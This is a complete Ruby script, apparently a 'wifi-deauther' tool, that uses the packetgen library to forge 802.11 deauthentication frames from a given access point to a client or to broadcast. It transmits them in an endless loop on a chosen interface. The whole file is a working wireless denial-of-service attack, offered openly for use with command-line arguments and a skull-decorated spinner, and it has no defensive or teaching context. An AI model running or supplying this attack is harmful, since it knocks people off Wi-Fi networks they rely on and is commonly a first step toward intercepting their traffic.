require 'packetgen'
require 'tty-spinner'

if ARGV.length != 3 || ARGV[0] == "--help"
    puts '[!] How to use: sudo ruby ./wifi-deauther.rb [interface] [bssid] [sta or broadcast]'
    exit!
end

@iface = ARGV[0]
@bssid = ARGV[1]
@client = ARGV[2]

def wifideauther
  @pkt = PacketGen.gen('RadioTap')
    .add('Dot11::Management', mac1: @client, mac2: @bssid, mac3: @bssid)
    .add('Dot11::DeAuth', reason: 2)
  spinner = TTY::Spinner.new("[:spinner] #{@bssid} ☠️ #{@client} ", format: :classic)
  spinner.auto_spin
  loop do
    @pkt.to_w(@iface)
  end
end

wifideauther